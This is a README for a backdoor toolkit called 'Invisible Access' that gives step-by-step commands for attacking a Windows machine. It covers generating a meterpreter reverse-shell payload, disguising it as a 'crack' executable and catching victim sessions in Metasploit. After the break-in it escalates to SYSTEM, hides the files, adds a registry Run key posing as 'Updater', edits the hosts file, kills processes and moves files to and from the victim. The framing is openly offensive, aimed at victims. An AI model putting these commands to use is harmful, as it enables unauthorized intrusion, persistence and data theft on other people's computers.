# Invisible Access 👁‍🗨
This repository is part of the 3HK initiative. It provides an experimental framework for generating custom payloads and demonstrating basic backdoor mechanisms.
The goal is to illustrate core concepts of access persistence, payload delivery, and post-exploitation techniques.
Alongside the scripts, you’ll find explanatory notes and sample files that serve as learning references.
```
Use it wisely. Or don’t.
```
👹 3HK

## Static Ip
### Basic step

1.    Install VMware Workstation or any other virtual Machine 
2.    download kali-linux-2025-W22-installer-amd64 *(ISO)*
3.    Create your own Machine

### VMware Settings

   1. Player -> Manage -> Virtual Machine Settings
   2. Network Adapter  -> Bridged : Connected directly to the physical Network
   3. select *_Replicate physical network connection state_*

### Point Acces Mobile (متاصل من هاتف)
```
 sudo nano /etc/network/interfaces
```
*  Write :
```
# The loopback network interface
auto lo
iface lo inet loopback
```
*  Now we go to *Resolv.conf*
```
sudo nano /etc/resolv.conf
```
*  Add your nameserver, exemple if ur ip is 192.168.42.50 put 
```
nameserver 192.168.42.1
```
*  ⚠️**Restart your pc**

### WIFI
```
 sudo nano /etc/network/interfaces
```
	Clear the previous two lines of *Point Acces Mobile (متاصل من هاتف)*
	add these lines and dont forget to change *XXX* to a number between 1 to 255.
```
auto eth0
iface eth0 inet static
    address 192.168.1.XXX
    netmask 255.255.255.0
    gateway 192.168.1.1
```
*  Now we go to **Resolv.conf**
```
sudo nano /etc/resolv.conf
```
*  Add these domains 
```
nameserver 8.8.8.8
nameserver 8.8.4.4
nameserver 1.1.1.1
```
*  ⚠️**Restart your pc**

## Download Tools

**Metasploit**
```
sudo apt install metasploit-framework
```
**ps2exe**
*  run PowerShell as an administrator
```
Find-Module -Name PowerShellGet | Install-Module 
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Install-Module -Name ps2exe
```
## Command line

*  Here u gonne find all command u need, we started with Created Payload
```
Cd Desktop
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={YOUR IP} LPORT={YOUR PORT 8080 or 4444 ...} -f exe -o {Name of your Payload}.exe
```
   **Compression of Payload**
```
tar -czvf {Compressed file name}.tar.gz {Name of your Payload}.exe
```
   **Create a Malware backdoor**

   *  Download my file _Crack.ps1_
  *  Edit the file to suit your Payload.

   **Convert file powershell (.Ps1) to Exe**
   1.    Run Powershell.
   2.    Go to the file location.
   3.    Command line (Change name *crack* to your)
```
Invoke-ps2exe .\crack.ps1 .\crack.exe -noConsole
```

### Metasploit
  *  Now with the moment awaited to hack the victim 🗡
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {YOUR IP}
set LPORT {YOUR PORT 8080 or 4444 ...}
run
```
This is the quiet before the breach *_msfconsole_* is loaded. *Payload* deployed,
Metasploit doesn’t knock — it walks in, one click, one exploit... and they’re mine 🗡
After they made the mistake :)
``` 
Sessions -i
```
   **Chose the sessions of your victime example 1**
```
sessions 1
getuid   | يعرض المستخدم الحالي
getsystem  | أخد صلاحية System
```
   **Hide files, change your file link if you change it**
```
execute -f cmd.exe -a "/c attrib +h +s C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\{Name of your Payload}.exe"

execute -f cmd.exe -a "/c attrib +h +s C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\{Name of your Backdoor crack}.exe"
```
   **Create the file in the registry**
```
reg setval -k "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -v "Updater" -d "C:\\Users\\Administrator\\AppData\\Roaming\\{Name of your Payload}.exe"
```
   **Block Website**
```
execute -f cmd.exe -a "/c echo 127.0.0.1 {PUT LINK OF WEBSITE U WANT TO BLOCK}.com >> C:\\Windows\\System32\\drivers\\etc\\hosts"
```
   **Kill Programe (Stop Running)**
```
execute -f cmd.exe -a "/c taskkill /{PROGRAM NAME}.exe /F"
```
   **Upload the file to the victim's pc**
```
upload /home/xxxx/Desktop/YYY
```
  *  xxxx : name of ur folder (link)
  *  YYY  : name of file 

 **Download file from victim's pc**
*  access the file do you want to take from it
```
Download FILE_NAME
```
 
## Tutorial Video 
[![3HK- Backdoor](https://user-images.githubusercontent.com/47686437/168548113-b3cd4206-3281-445b-b7c6-bc0a3251293d.png)](https://youtu.be/il4H8FB2BLg)

## Whatsapp Channel
[![3HK- Backdoor](https://github.com/appicons/Whatsapp/blob/master/icons/whatsapp_194x194.png)](https://whatsapp.com/channel/0029Vb62RTF0G0XeN4Qx4c3W)







